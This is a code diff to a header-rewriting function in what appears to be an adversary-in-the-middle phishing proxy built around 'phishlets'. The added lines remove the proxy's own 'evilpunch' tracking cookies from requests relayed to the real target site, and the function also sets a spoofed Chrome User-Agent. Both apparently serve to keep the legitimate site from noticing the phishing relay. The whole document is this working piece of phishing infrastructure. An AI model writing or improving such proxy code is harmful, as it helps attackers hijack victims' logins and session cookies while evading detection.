@@ -12,7 +12,32 @@ def patch_headers_out(headers, proxy_host, target_host, phishlet_data=None):
         # It's already a regular dict
         headers_dict = headers.copy()
     
-
+    # check cookie header find cookie name starting with evilpunch and delete that cookies
+    
+    # check cookie header find cookie name starting with evilpunch and delete that cookies
+    if 'Cookie' in headers_dict:
+        cookie_header = headers_dict['Cookie']
+        if cookie_header:
+            # Split cookies by semicolon and filter out evilpunch cookies
+            cookies = [cookie.strip() for cookie in cookie_header.split(';')]
+            filtered_cookies = []
+            
+            for cookie in cookies:
+                # Check if cookie name starts with 'evilpunch' (case insensitive)
+                cookie_name = cookie.split('=')[0].strip()
+                if not cookie_name.lower().startswith('evilpunch'):
+                    filtered_cookies.append(cookie)
+            
+            # Update the Cookie header with filtered cookies
+            if filtered_cookies:
+                headers_dict['Cookie'] = '; '.join(filtered_cookies)
+                print(f"  🍪 Filtered cookies: {len(filtered_cookies)} remaining out of {len(cookies)} original")
+            else:
+                # Remove Cookie header entirely if no cookies remain (including case where only evilpunch cookie exists)
+                del headers_dict['Cookie']
+                print(f"  🍪 Removed all evilpunch cookies from request - deleted entire Cookie header")
+           
+       
     #  chnage value of User-Agent
     if "User-Agent" in headers_dict:
         headers_dict['User-Agent'] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
